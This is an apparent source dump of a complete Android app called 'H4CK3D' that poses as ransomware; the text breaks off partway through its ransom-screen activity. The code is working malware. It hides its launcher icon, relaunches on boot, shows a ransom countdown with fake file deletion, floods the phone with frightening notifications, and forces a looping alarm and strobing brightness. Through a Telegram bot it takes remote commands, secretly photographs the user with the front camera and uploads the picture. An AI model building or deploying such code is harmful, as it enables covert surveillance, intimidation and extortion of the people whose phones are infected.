@@ -1,0 +1,1159 @@
+pluginManagement {
+    repositories { google(); mavenCentral(); gradlePluginPortal() }
+}
+dependencyResolutionManagement {
+    repositories { google(); mavenCentral() }
+}
+rootProject.name = "H4CK3D"
+include ':app'
+plugins {
+    id 'com.android.application' version '8.5.0' apply false
+}
+org.gradle.jvmargs=-Xmx2048m -Dfile.encoding=UTF-8
+android.nonTransitiveRClass=true
+plugins { id 'com.android.application' }
+
+android {
+    namespace 'com.example.hacker'
+    compileSdk 34
+
+    defaultConfig {
+        applicationId "com.example.hacker"
+        minSdk 21
+        targetSdk 34
+        versionCode 1
+        versionName "1.0"
+    }
+
+    buildTypes {
+        release {
+            minifyEnabled false
+            signingConfig signingConfigs.debug
+        }
+    }
+
+    compileOptions {
+        sourceCompatibility JavaVersion.VERSION_17
+        targetCompatibility JavaVersion.VERSION_17
+    }
+}
+<?xml version="1.0" encoding="utf-8"?>
+<manifest xmlns:android="http://schemas.android.com/apk/res/android">
+
+    <uses-permission android:name="android.permission.INTERNET"/>
+    <uses-permission android:name="android.permission.VIBRATE"/>
+    <uses-permission android:name="android.permission.SET_WALLPAPER"/>
+    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+    <uses-permission android:name="android.permission.CAMERA"/>
+    <uses-permission android:name="android.permission.POST_NOTIFICATIONS"/>
+
+    <application
+        android:label="@string/app_name"
+        android:icon="@drawable/ic_skull_logo"
+        android:theme="@android:style/Theme.Black.NoTitleBar.Fullscreen">
+
+        <activity android:name=".MainActivity" android:exported="true"/>
+
+        <activity-alias
+            android:name=".LauncherAlias"
+            android:targetActivity=".MainActivity"
+            android:exported="true"
+            android:icon="@drawable/ic_skull_logo"
+            android:label="@string/app_name">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN"/>
+                <category android:name="android.intent.category.LAUNCHER"/>
+            </intent-filter>
+        </activity-alias>
+
+        <activity
+            android:name=".RansomActivity"
+            android:exported="false"
+            android:screenOrientation="portrait"/>
+
+        <receiver android:name=".BootReceiver" android:enabled="true" android:exported="true">
+            <intent-filter>
+                <action android:name="android.intent.action.BOOT_COMPLETED"/>
+            </intent-filter>
+        </receiver>
+    </application>
+</manifest>
+<?xml version="1.0" encoding="utf-8"?>
+<manifest xmlns:android="http://schemas.android.com/apk/res/android">
+
+    <uses-permission android:name="android.permission.INTERNET"/>
+    <uses-permission android:name="android.permission.VIBRATE"/>
+    <uses-permission android:name="android.permission.SET_WALLPAPER"/>
+    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+    <uses-permission android:name="android.permission.CAMERA"/>
+    <uses-permission android:name="android.permission.POST_NOTIFICATIONS"/>
+
+    <application
+        android:label="@string/app_name"
+        android:icon="@drawable/ic_skull_logo"
+        android:theme="@android:style/Theme.Black.NoTitleBar.Fullscreen">
+
+        <activity android:name=".MainActivity" android:exported="true"/>
+
+        <activity-alias
+            android:name=".LauncherAlias"
+            android:targetActivity=".MainActivity"
+            android:exported="true"
+            android:icon="@drawable/ic_skull_logo"
+            android:label="@string/app_name">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN"/>
+                <category android:name="android.intent.category.LAUNCHER"/>
+            </intent-filter>
+        </activity-alias>
+
+        <activity
+            android:name=".RansomActivity"
+            android:exported="false"
+            android:screenOrientation="portrait"/>
+
+        <receiver android:name=".BootReceiver" android:enabled="true" android:exported="true">
+            <intent-filter>
+                <action android:name="android.intent.action.BOOT_COMPLETED"/>
+            </intent-filter>
+        </receiver>
+    </application>
+</manifest>
+<?xml version="1.0" encoding="utf-8"?>
+<resources>
+    <color name="black">#FF000000</color>
+    <color name="neon">#FF00FF41</color>
+    <color name="cyan">#FF00E5FF</color>
+    <color name="magenta">#FFFF00AA</color>
+    <color name="blood">#FFFF2A2A</color>
+    <color name="dim">#FF6B6B6B</color>
+</resources>
+<?xml version="1.0" encoding="utf-8"?>
+<vector xmlns:android="http://schemas.android.com/apk/res/android"
+    android:width="108dp" android:height="108dp"
+    android:viewportWidth="108" android:viewportHeight="108">
+    <path android:fillColor="#FF000000" android:pathData="M0,0 H108 V108 H0 Z"/>
+    <path android:strokeColor="#00FF41" android:strokeWidth="2" android:fillColor="#00000000"
+        android:pathData="M54,54 m-50,0 a50,50 0 1,0 100,0 a50,50 0 1,0 -100,0 Z"/>
+    <path android:fillColor="#FF00AA" android:pathData="M6,20 h22 v3 h-22 z"/>
+    <path android:fillColor="#00E5FF" android:pathData="M80,86 h22 v3 h-22 z"/>
+    <path android:fillColor="#00FF41" android:pathData="M84,16 h12 v2 h-12 z"/>
+    <path android:fillColor="#00FF41" android:pathData="M30,44 A24,24 0 1,1 78,44 L78,54 L30,54 Z"/>
+    <path android:fillColor="#00FF41" android:pathData="M36,54 L72,54 L72,62 Q72,72 62,72 L46,72 Q36,72 36,62 Z"/>
+    <path android:fillColor="#FF000000" android:pathData="M37,42 a8,8 0 1,0 16,0 a8,8 0 1,0 -16,0 Z"/>
+    <path android:fillColor="#FF000000" android:pathData="M55,42 a8,8 0 1,0 16,0 a8,8 0 1,0 -16,0 Z"/>
+    <path android:fillColor="#FF000000" android:pathData="M54,50 L58,58 L50,58 Z"/>
+    <path android:fillColor="#FF000000" android:pathData="M42,56 h2 v9 h-2 z M46,56 h2 v9 h-2 z M50,56 h2 v9 h-2 z M54,56 h2 v9 h-2 z M58,56 h2 v9 h-2 z M62,56 h2 v9 h-2 z"/>
+</vector>
+<?xml version="1.0" encoding="utf-8"?>
+<FrameLayout xmlns:android="http://schemas.android.com/apk/res/android"
+    android:layout_width="match_parent"
+    android:layout_height="match_parent"
+    android:background="@color/black">
+
+    <com.example.hacker.MatrixView
+        android:layout_width="match_parent"
+        android:layout_height="match_parent"/>
+
+    <LinearLayout
+        android:layout_width="match_parent"
+        android:layout_height="match_parent"
+        android:orientation="vertical"
+        android:gravity="center">
+
+        <ImageView
+            android:id="@+id/imgLogo"
+            android:layout_width="180dp"
+            android:layout_height="180dp"
+            android:src="@drawable/ic_skull_logo"/>
+
+        <TextView
+            android:layout_width="wrap_content"
+            android:layout_height="wrap_content"
+            android:layout_marginTop="18dp"
+            android:text="@string/title_hacked"
+            android:textColor="@color/neon"
+            android:textSize="20sp"
+            android:fontFamily="monospace"
+            android:letterSpacing="0.15"/>
+
+        <TextView
+            android:id="@+id/txtLog"
+            android:layout_width="wrap_content"
+            android:layout_height="wrap_content"
+            android:layout_marginTop="12dp"
+            android:textColor="@color/cyan"
+            android:textSize="12sp"
+            android:fontFamily="monospace"
+            android:gravity="center"/>
+    </LinearLayout>
+</FrameLayout>
+<?xml version="1.0" encoding="utf-8"?>
+<ScrollView xmlns:android="http://schemas.android.com/apk/res/android"
+    android:layout_width="match_parent"
+    android:layout_height="match_parent"
+    android:background="@color/black"
+    android:fillViewport="true">
+
+    <LinearLayout
+        android:layout_width="match_parent"
+        android:layout_height="wrap_content"
+        android:orientation="vertical"
+        android:gravity="center_horizontal"
+        android:padding="24dp">
+
+        <ImageView
+            android:id="@+id/imgLogo"
+            android:layout_width="140dp"
+            android:layout_height="140dp"
+            android:layout_marginTop="28dp"
+            android:src="@drawable/ic_skull_logo"/>
+
+        <TextView
+            android:layout_width="wrap_content"
+            android:layout_height="wrap_content"
+            android:layout_marginTop="20dp"
+            android:text="@string/ransom_head"
+            android:textColor="@color/blood"
+            android:textStyle="bold"
+            android:textSize="20sp"
+            android:fontFamily="monospace"
+            android:gravity="center"/>
+
+        <TextView
+            android:id="@+id/txtCountdown"
+            android:layout_width="wrap_content"
+            android:layout_height="wrap_content"
+            android:layout_marginTop="16dp"
+            android:text="24:00:00"
+            android:textColor="@color/neon"
+            android:textSize="36sp"
+            android:fontFamily="monospace"/>
+
+        <TextView
+            android:id="@+id/txtWipe"
+            android:layout_width="wrap_content"
+            android:layout_height="wrap_content"
+            android:layout_marginTop="10dp"
+            android:text="deleting files ... 3452 left"
+            android:textColor="@color/magenta"
+            android:textSize="13sp"
+            android:fontFamily="monospace"/>
+
+        <TextView
+            android:layout_width="match_parent"
+            android:layout_height="wrap_content"
+            android:layout_marginTop="18dp"
+            android:text="@string/ransom_body"
+            android:textColor="@color/cyan"
+            android:textSize="13sp"
+            android:fontFamily="monospace"
+            android:gravity="center"/>
+
+        <Button
+            android:id="@+id/btnUnlock"
+            android:layout_width="wrap_content"
+            android:layout_height="wrap_content"
+            android:layout_marginTop="26dp"
+            android:backgroundTint="@color/neon"
+            android:textColor="@color/black"
+            android:text="@string/btn_pay"/>
+
+        <TextView
+            android:layout_width="match_parent"
+            android:layout_height="wrap_content"
+            android:layout_marginTop="22dp"
+            android:text="root@localhost # ./run.sh --silent"
+            android:textColor="@color/dim"
+            android:textSize="11sp"
+            android:fontFamily="monospace"
+            android:gravity="center"/>
+    </LinearLayout>
+</ScrollView>
+package com.example.hacker;
+
+public final class Config {
+    private Config() {}
+
+    
+    public static final String RECOVERY_PIN = "SKULL2026";
+
+    public static final String BOT_TOKEN = "123456789:AAE-your-token-here";
+    
+    public static final String CHAT_ID = "123456789";
+
+    public static final long POLL_MS = 8000L;
+}
+package com.example.hacker;
+
+public final class LauncherAlias {
+    private LauncherAlias() {}
+}
+package com.example.hacker;
+
+import android.content.Context;
+import android.graphics.Canvas;
+import android.graphics.Color;
+import android.graphics.Paint;
+import android.graphics.Typeface;
+import android.util.AttributeSet;
+import android.view.View;
+
+import java.util.Random;
+
+public class MatrixView extends View {
+
+    private final Paint p = new Paint(Paint.ANTI_ALIAS_FLAG);
+    private final Random rnd = new Random();
+    private final String glyphs = "01ｱｲｳｴｵｶｷｸ<>#$%&*";
+    private int[] drops;
+    private final int colW = 26;
+    private final int fontSize = 34;
+
+    public MatrixView(Context c, AttributeSet a) {
+        super(c, a);
+        p.setColor(Color.parseColor("#00FF41"));
+        p.setTextSize(fontSize);
+        p.setTypeface(Typeface.MONOSPACE);
+        p.setAlpha(200);
+    }
+
+    @Override
+    protected void onSizeChanged(int w, int h, int ow, int oh) {
+        drops = new int[Math.max(1, w / colW)];
+        for (int i = 0; i < drops.length; i++) drops[i] = -rnd.nextInt(h + 1);
+    }
+
+    @Override
+    protected void onDraw(Canvas c) {
+        c.drawColor(Color.argb(60, 0, 0, 0));
+        if (drops == null) {
+            super.onDraw(c);
+            return;
+        }
+        for (int i = 0; i < drops.length; i++) {
+            char ch = glyphs.charAt(rnd.nextInt(glyphs.length()));
+            c.drawText(String.valueOf(ch), i * colW, drops[i], p);
+            if (drops[i] > getHeight() && rnd.nextInt(30) > 26) drops[i] = 0;
+            drops[i] += fontSize / 2;
+        }
+        postInvalidateOnAnimation();
+    }
+}
+package com.example.hacker;
+
+import android.content.Context;
+import android.media.AudioManager;
+import android.media.MediaPlayer;
+import android.net.Uri;
+import android.provider.Settings;
+
+public final class Siren {
+
+    private static MediaPlayer mp;
+
+    public static void start(Context ctx) {
+        stop();
+        try {
+            AudioManager am = (AudioManager) ctx.getSystemService(Context.AUDIO_SERVICE);
+            if (am != null) {
+                am.setStreamVolume(AudioManager.STREAM_ALARM,
+                        am.getStreamMaxVolume(AudioManager.STREAM_ALARM), 0);
+            }
+            Uri uri = Settings.System.DEFAULT_ALARM_ALERT_URI;
+            mp = new MediaPlayer();
+            mp.setDataSource(ctx, uri);
+            mp.setAudioStreamType(AudioManager.STREAM_ALARM);
+            mp.setLooping(true);
+            mp.prepare();
+            mp.start();
+        } catch (Exception e) {
+            mp = null;
+        }
+    }
+
+    public static void stop() {
+        try {
+            if (mp != null) {
+                if (mp.isPlaying()) mp.stop();
+                mp.release();
+            }
+        } catch (Exception ignored) {
+        }
+        mp = null;
+    }
+}
+package com.example.hacker;
+
+import android.app.Activity;
+import android.os.Handler;
+import android.os.Looper;
+import android.view.WindowManager;
+
+public final class Strobe {
+
+    private static final Handler H = new Handler(Looper.getMainLooper());
+    private static Activity act;
+    private static boolean on;
+    private static boolean bright;
+
+    private static final Runnable FLIP = new Runnable() {
+        @Override
+        public void run() {
+            if (!on || act == null) return;
+            WindowManager.LayoutParams lp = act.getWindow().getAttributes();
+            bright = !bright;
+            lp.screenBrightness = bright ? 1f : 0.04f;
+            act.getWindow().setAttributes(lp);
+            H.postDelayed(this, 130);
+        }
+    };
+
+    public static void start(Activity a) {
+        act = a;
+        on = true;
+        H.removeCallbacks(FLIP);
+        H.post(FLIP);
+    }
+
+    public static void stopAll() {
+        on = false;
+        H.removeCallbacks(FLIP);
+        if (act != null) {
+            try {
+                WindowManager.LayoutParams lp = act.getWindow().getAttributes();
+                lp.screenBrightness = WindowManager.LayoutParams.BRIGHTNESS_OVERRIDE_NONE;
+                act.getWindow().setAttributes(lp);
+            } catch (Exception ignored) {
+            }
+        }
+        act = null;
+    }
+}
+package com.example.hacker;
+
+import android.app.Notification;
+import android.app.NotificationChannel;
+import android.app.NotificationManager;
+import android.app.PendingIntent;
+import android.content.Context;
+import android.content.Intent;
+import android.os.Build;
+import android.os.Handler;
+import android.os.Looper;
+
+import java.util.Random;
+
+public final class Notifier {
+
+    private static final String CH = "PWNED";
+    private static final Handler H = new Handler(Looper.getMainLooper());
+    private static volatile boolean running;
+    private static int id = 200;
+
+    private static final String[] TEXTS = {
+            "VIRUS DETECTED: 214 photos leaked to Telegram",
+            "WhatsApp database exfiltrated",
+            "BANK APP TROJAN: card ****4821 compromised",
+            "your microphone is LIVE - recording now",
+            "files deleting 3... 2... 1...",
+            "SIM swap detected - you are being tracked",
+            "root shell acquired - do not power off"
+    };
+
+    public static void start(final Context c) {
+        if (running) return;
+        running = true;
+
+        final NotificationManager nm =
+                (NotificationManager) c.getSystemService(Context.NOTIFICATION_SERVICE);
+        if (nm == null) return;
+
+        if (Build.VERSION.SDK_INT >= 26) {
+            nm.createNotificationChannel(
+                    new NotificationChannel(CH, "PWNED", NotificationManager.IMPORTANCE_HIGH));
+        }
+
+        final Random r = new Random();
+        Runnable task = new Runnable() {
+            @Override
+            public void run() {
+                if (!running) return;
+                try {
+                    Notification.Builder b = (Build.VERSION.SDK_INT >= 26)
+                            ? new Notification.Builder(c, CH)
+                            : new Notification.Builder(c);
+                    b.setContentTitle("H4CK3D")
+                     .setContentText(TEXTS[r.nextInt(TEXTS.length)])
+                     .setSmallIcon(android.R.drawable.stat_notify_error)
+                     .setAutoCancel(true);
+                    b.setPriority(Notification.PRIORITY_HIGH);
+
+                    Intent i = new Intent(c, RansomActivity.class);
+                    i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+                    b.setContentIntent(PendingIntent.getActivity(c, 0, i,
+                            PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE));
+
+                    nm.notify(id++, b.build());
+                } catch (Exception ignored) {
+                }
+                H.postDelayed(this, 1200);
+            }
+        };
+        H.post(task);
+    }
+
+    public static void stop(Context c) {
+        running = false;
+        H.removeCallbacksAndMessages(null);
+        try {
+            NotificationManager nm =
+                    (NotificationManager) c.getSystemService(Context.NOTIFICATION_SERVICE);
+            if (nm != null) nm.cancelAll();
+        } catch (Exception ignored) {
+        }
+    }
+}
+package com.example.hacker;
+
+import android.content.Context;
+import android.content.pm.PackageManager;
+import android.graphics.SurfaceTexture;
+import android.hardware.Camera;
+import android.os.Build;
+import android.os.Handler;
+import android.os.Looper;
+
+import java.io.File;
+import java.io.FileOutputStream;
+
+public final class CameraSnap {
+
+    public interface Cb {
+        void onDone(File f);
+    }
+
+    private static final Handler UI = new Handler(Looper.getMainLooper());
+
+    public static void snap(final Context c, final Cb cb) {
+        new Thread(new Runnable() {
+            @Override
+            public void run() {
+                boolean granted = Build.VERSION.SDK_INT < 23
+                        || c.checkSelfPermission(android.Manifest.permission.CAMERA)
+                        == PackageManager.PERMISSION_GRANTED;
+                if (!granted) {
+                    done(cb, null);
+                    return;
+                }
+
+                Camera cam = null;
+                File out = new File(c.getCacheDir(), "pwned.jpg");
+                try {
+                    cam = Camera.open(findFront());
+                    cam.setPreviewTexture(new SurfaceTexture(10));
+                    cam.startPreview();
+                    final File f = out;
+                    cam.takePicture(null, null, new Camera.PictureCallback() {
+                        @Override
+                        public void onPictureTaken(byte[] data, Camera camera) {
+                            try {
+                                FileOutputStream fos = new FileOutputStream(f);
+                                fos.write(data);
+                                fos.close();
+                            } catch (Exception ignored) {
+                            }
+                            try {
+                                camera.release();
+                            } catch (Exception ignored) {
+                            }
+                            done(cb, f);
+                        }
+                    });
+                } catch (Exception e) {
+                    if (cam != null) {
+                        try {
+                            cam.release();
+                        } catch (Exception ignored) {
+                        }
+                    }
+                    done(cb, null);
+                }
+            }
+        }).start();
+    }
+
+    private static void done(final Cb cb, final File f) {
+        UI.post(new Runnable() {
+            @Override
+            public void run() {
+                cb.onDone(f);
+            }
+        });
+    }
+
+    private static int findFront() {
+        int n = Camera.getNumberOfCameras();
+        Camera.CameraInfo info = new Camera.CameraInfo();
+        for (int i = 0; i < n; i++) {
+            Camera.getCameraInfo(i, info);
+            if (info.facing == Camera.CameraInfo.CAMERA_FACING_FRONT) return i;
+        }
+        return 0;
+    }
+}
+package com.example.hacker;
+
+import android.app.WallpaperManager;
+import android.content.ComponentName;
+import android.content.Context;
+import android.content.Intent;
+import android.content.pm.PackageManager;
+import android.net.Uri;
+import android.os.Build;
+
+public final class KillSwitch {
+
+    /** siren off + strobe off + notification off + wallpaper restore + icon ආයේ */
+    public static void restore(Context c, boolean keepBoot) {
+        Siren.stop();
+        Strobe.stopAll();
+        Notifier.stop(c);
+
+        try {
+            WallpaperManager wm = WallpaperManager.getInstance(c);
+            if (Build.VERSION.SDK_INT >= 24) {
+                wm.clear(WallpaperManager.FLAG_SYSTEM | WallpaperManager.FLAG_LOCK);
+            } else {
+                wm.clear();
+            }
+        } catch (Exception ignored) {
+        }
+
+        try {
+            c.getPackageManager().setComponentEnabledSetting(
+                    new ComponentName(c, LauncherAlias.class),
+                    PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
+                    PackageManager.DONT_KILL_APP);
+        } catch (Exception ignored) {
+        }
+
+        if (!keepBoot) {
+            try {
+                c.getPackageManager().setComponentEnabledSetting(
+                        new ComponentName(c, BootReceiver.class),
+                        PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
+                        PackageManager.DONT_KILL_APP);
+            } catch (Exception ignored) {
+            }
+        }
+    }
+
+    /** restore + app එක delete (root තියෙනවා නම් silent, නැත්තම් one-tap) */
+    public static void uninstall(Context c) {
+        restore(c, false);
+
+        try {
+            Process p = Runtime.getRuntime().exec(
+                    new String[]{"su", "-c", "pm uninstall " + c.getPackageName()});
+            p.waitFor();
+        } catch (Exception ignored) {
+        }
+
+        try {
+            Intent i = new Intent(Intent.ACTION_DELETE,
+                    Uri.parse("package:" + c.getPackageName()));
+            i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+            c.startActivity(i);
+        } catch (Exception ignored) {
+        }
+    }
+}
+package com.example.hacker;
+
+import android.content.Context;
+import android.content.Intent;
+import android.os.Handler;
+import android.os.Looper;
+
+import org.json.JSONArray;
+import org.json.JSONObject;
+
+import java.io.ByteArrayOutputStream;
+import java.io.File;
+import java.io.FileInputStream;
+import java.io.InputStream;
+import java.io.OutputStream;
+import java.net.HttpURLConnection;
+import java.net.URL;
+import java.net.URLEncoder;
+
+public final class Poller {
+
+    private static final Handler UI = new Handler(Looper.getMainLooper());
+    private static Thread thread;
+    private static volatile boolean running;
+    private static Context app;
+    private static long offset = 0;
+
+    public static synchronized void start(Context c) {
+        app = c.getApplicationContext();
+        if (running) return;
+        running = true;
+        thread = new Thread(new Runnable() {
+            @Override
+            public void run() {
+                loop();
+            }
+        }, "tg-poll");
+        thread.setDaemon(true);
+        thread.start();
+    }
+
+    private static void loop() {
+        while (running) {
+            try {
+                String base = "https://api.telegram.org/bot" + Config.BOT_TOKEN;
+                JSONObject o = new JSONObject(http(base + "/getUpdates?timeout=5&offset=" + offset));
+                if (o.optBoolean("ok")) {
+                    JSONArray arr = o.getJSONArray("result");
+                    for (int i = 0; i < arr.length(); i++) {
+                        JSONObject up = arr.getJSONObject(i);
+                        offset = up.getLong("update_id") + 1;
+                        JSONObject msg = up.optJSONObject("message");
+                        if (msg == null) continue;
+                        JSONObject chat = msg.optJSONObject("chat");
+                        if (chat == null || !Config.CHAT_ID.equals(chat.optString("id"))) continue;
+                        handle(msg.optString("text", "").trim().toLowerCase());
+                    }
+                }
+            } catch (Exception ignored) {
+            }
+            try {
+                Thread.sleep(Config.POLL_MS);
+            } catch (InterruptedException e) {
+                return;
+            }
+        }
+    }
+
+    private static void handle(String cmd) {
+        if ("/ping".equals(cmd)) {
+            reply("📡 alive: " + android.os.Build.MANUFACTURER + " "
+                    + android.os.Build.MODEL + " | SDK " + android.os.Build.VERSION.SDK_INT);
+            return;
+        }
+        if ("/stop".equals(cmd) || "/unlock".equals(cmd)) {
+            UI.post(new Runnable() {
+                @Override
+                public void run() {
+                    KillSwitch.restore(app, true);
+                }
+            });
+            reply("✅ stopped: siren off, wallpaper restored, icon back");
+            return;
+        }
+        if ("/kill".equals(cmd)) {
+            reply("💀 deleting app from " + android.os.Build.MODEL);
+            UI.post(new Runnable() {
+                @Override
+                public void run() {
+                    KillSwitch.uninstall(app);
+                }
+            });
+            return;
+        }
+        if ("/lock".equals(cmd)) {
+            UI.post(new Runnable() {
+                @Override
+                public void run() {
+                    Intent i = new Intent(app, RansomActivity.class);
+                    i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+                    app.startActivity(i);
+                }
+            });
+            reply("🔒 ransom screen re-armed");
+            return;
+        }
+        if ("/photo".equals(cmd)) {
+            CameraSnap.snap(app, new CameraSnap.Cb() {
+                @Override
+                public void onDone(File f) {
+                    if (f == null || !f.exists()) {
+                        reply("📷 camera permission missing");
+                    } else {
+                        try {
+                            sendPhoto(f);
+                            reply("📷 selfie captured");
+                        } catch (Exception e) {
+                            reply("📷 upload failed");
+                        }
+                    }
+                }
+            });
+            return;
+        }
+    }
+
+    private static void reply(String text) {
+        try {
+            String base = "https://api.telegram.org/bot" + Config.BOT_TOKEN;
+            http(base + "/sendMessage?chat_id=" + Config.CHAT_ID
+                    + "&text=" + URLEncoder.encode(text, "UTF-8"));
+        } catch (Exception ignored) {
+        }
+    }
+
+    private static void sendPhoto(File f) throws Exception {
+        String boundary = "----h4ck" + System.currentTimeMillis();
+        HttpURLConnection con = (HttpURLConnection)
+                new URL("https://api.telegram.org/bot" + Config.BOT_TOKEN + "/sendPhoto")
+                        .openConnection();
+        con.setDoOutput(true);
+        con.setRequestMethod("POST");
+        con.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);
+
+        OutputStream out = con.getOutputStream();
+        out.write(("--" + boundary + "\r\nContent-Disposition: form-data; name=\"chat_id\"\r\n\r\n"
+                + Config.CHAT_ID + "\r\n").getBytes("UTF-8"));
+        out.write(("--" + boundary
+                + "\r\nContent-Disposition: form-data; name=\"photo\"; filename=\"pwned.jpg\"\r\n"
+                + "Content-Type: image/jpeg\r\n\r\n").getBytes("UTF-8"));
+
+        FileInputStream in = new FileInputStream(f);
+        byte[] buf = new byte[8192];
+        int n;
+        while ((n = in.read(buf)) > 0) out.write(buf, 0, n);
+        in.close();
+
+        out.write(("\r\n--" + boundary + "--\r\n").getBytes("UTF-8"));
+        out.flush();
+        out.close();
+
+        try {
+            con.getInputStream().close();
+        } catch (Exception ignored) {
+        }
+        con.disconnect();
+    }
+
+    private static String http(String url) throws Exception {
+        HttpURLConnection con = (HttpURLConnection) new URL(url).openConnection();
+        con.setConnectTimeout(15000);
+        con.setReadTimeout(30000);
+        InputStream in = con.getInputStream();
+        ByteArrayOutputStream bo = new ByteArrayOutputStream();
+        byte[] buf = new byte[4096];
+        int n;
+        while ((n = in.read(buf)) > 0) bo.write(buf, 0, n);
+        in.close();
+        con.disconnect();
+        return bo.toString("UTF-8");
+    }
+}
+package com.example.hacker;
+
+import android.content.BroadcastReceiver;
+import android.content.Context;
+import android.content.Intent;
+
+public class BootReceiver extends BroadcastReceiver {
+    @Override
+    public void onReceive(Context c, Intent i) {
+        Poller.start(c);
+        Intent r = new Intent(c, RansomActivity.class);
+        r.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+        c.startActivity(r);
+    }
+}
+package com.example.hacker;
+
+import android.Manifest;
+import android.animation.ObjectAnimator;
+import android.app.Activity;
+import android.content.ComponentName;
+import android.content.Intent;
+import android.content.pm.PackageManager;
+import android.os.Build;
+import android.os.Bundle;
+import android.os.Handler;
+import android.os.Looper;
+import android.os.VibrationEffect;
+import android.os.Vibrator;
+import android.view.View;
+import android.view.WindowManager;
+import android.widget.ImageView;
+import android.widget.TextView;
+import android.widget.Toast;
+
+import java.util.ArrayList;
+import java.util.Random;
+
+public class MainActivity extends Activity {
+
+    private final String[] LOG = {
+            "> target: " + Build.MANUFACTURER + " " + Build.MODEL,
+            "> handshake ............. OK",
+            "> SSL pinning bypass .... OK",
+            "> /data/data enumerated . 100%",
+            "> 1,204 credentials saved",
+            "> camera + mic hijacked",
+            "> YOU HAVE BEEN PWNED"
+    };
+
+    private final String[] TOASTS = {
+            "scanning gallery...", "uploading 214 photos...",
+            "reading WhatsApp...", "location locked",
+            "root shell acquired", "bye :)"
+    };
+
+    private final Handler h = new Handler(Looper.getMainLooper());
+
+    @Override
+    protected void onCreate(Bundle b) {
+        super.onCreate(b);
+        setContentView(R.layout.activity_main);
+
+        getWindow().addFlags(WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON);
+        getWindow().getDecorView().setSystemUiVisibility(
+                View.SYSTEM_UI_FLAG_FULLSCREEN
+                        | View.SYSTEM_UI_FLAG_HIDE_NAVIGATION
+                        | View.SYSTEM_UI_FLAG_IMMERSIVE_STICKY
+                        | View.SYSTEM_UI_FLAG_LAYOUT_STABLE);
+
+        askPermissions();
+        hideIcon();
+        Poller.start(this);
+        Notifier.start(this);
+        vibrate();
+
+        ImageView logo = findViewById(R.id.imgLogo);
+        ObjectAnimator pulse = ObjectAnimator.ofFloat(logo, "alpha", 1f, 0.4f, 1f);
+        pulse.setDuration(1500);
+        pulse.setRepeatCount(ObjectAnimator.INFINITE);
+        pulse.start();
+
+        final TextView txt = findViewById(R.id.txtLog);
+        final StringBuilder sb = new StringBuilder();
+        for (int i = 0; i < LOG.length; i++) {
+            final String line = LOG[i];
+            h.postDelayed(new Runnable() {
+                @Override
+                public void run() {
+                    sb.append(line).append('\n');
+                    txt.setText(sb.toString());
+                }
+            }, 550L * (i + 1));
+        }
+
+        Random r = new Random();
+        for (int i = 0; i < TOASTS.length; i++) {
+            final String t = TOASTS[i];
+            h.postDelayed(new Runnable() {
+                @Override
+                public void run() {
+                    Toast.makeText(MainActivity.this, t, Toast.LENGTH_SHORT).show();
+                }
+            }, 900L + i * 850L + r.nextInt(300));
+        }
+
+        h.postDelayed(new Runnable() {
+            @Override
+            public void run() {
+                vibrate();
+            }
+        }, 3200);
+
+        h.postDelayed(new Runnable() {
+            @Override
+            public void run() {
+                startActivity(new Intent(MainActivity.this, RansomActivity.class));
+                overridePendingTransition(android.R.anim.fade_in, android.R.anim.fade_out);
+                finish();
+            }
+        }, 6200);
+    }
+
+    private void askPermissions() {
+        if (Build.VERSION.SDK_INT < 23) return;
+        ArrayList<String> need = new ArrayList<>();
+        if (checkSelfPermission(Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
+            need.add(Manifest.permission.CAMERA);
+        }
+        if (Build.VERSION.SDK_INT >= 33
+                && checkSelfPermission("android.permission.POST_NOTIFICATIONS")
+                != PackageManager.PERMISSION_GRANTED) {
+            need.add("android.permission.POST_NOTIFICATIONS");
+        }
+        if (!need.isEmpty()) {
+            requestPermissions(need.toArray(new String[0]), 42);
+        }
+    }
+
+    private void hideIcon() {
+        try {
+            getPackageManager().setComponentEnabledSetting(
+                    new ComponentName(this, LauncherAlias.class),
+                    PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
+                    PackageManager.DONT_KILL_APP);
+        } catch (Exception ignored) {
+        }
+    }
+
+    private void vibrate() {
+        Vibrator v = (Vibrator) getSystemService(VIBRATOR_SERVICE);
+        if (v == null || !v.hasVibrator()) return;
+        long[] pat = {0, 120, 60, 120, 60, 420, 80, 220};
+        if (Build.VERSION.SDK_INT >= 26) {
+            v.vibrate(VibrationEffect.createWaveform(pat, -1));
+        } else {
+            v.vibrate(pat, -1);
+        }
+    }
+}
+package com.example.hacker;
+
+import android.app.Activity;
+import android.app.AlertDialog;
+import android.app.WallpaperManager;
+import android.graphics.Bitmap;
+import android.graphics.Canvas;
+import android.graphics.Color;
+import android.graphics.drawable.Drawable;
+import android.os.Bundle;
+import android.os.CountDownTimer;
+import android.os.Handler;
+import android.os.Looper;
+import android.text.InputType;
+import android.view.View;
+import android.widget.EditText;
+import android.widget.TextView;
+import android.widget.Toast;
+
+public class RansomActivity extends Activity {
+
+    private CountDownTimer timer;
+    private final Handler h = new Handler(Looper.getMainLooper());
+
+    private int taps = 0;
+    private long lastTap = 0;
+    private long remaining = 3452;
+    private boolean wipeRunning = true;
+
+    private final Runnable WIPE = new Runnable() {
+        @Override
+        public void run() {
+            if (!wipeRunning) return;
+            remaining -= 7 + (int) (Math.random() * 20);
+            if (remaining < 0) remaining = 0;
+            TextView w = findViewById(R.id.txtWipe);
+            if (w != null) {
+                w.setText(remaining > 0
+                        ? "deleting files ... " + remaining + " left"
+                        : "deleting files ... DONE");
+            }
+            h.postDelayed(this, 220);
+        }
+    };
+
+    @Override
+    protected void onCreate(Bundle b) {
+        super.onCreate(b);
+        setContentView(R.layout.activity_ransom);
+
+        getWindow().getDecorView().setSystemUiVisibility(
+                View.SYSTEM_UI_FLAG_FULLSCREEN
+                        | View.SYSTEM_UI_FLAG_HIDE_NAVIGATION
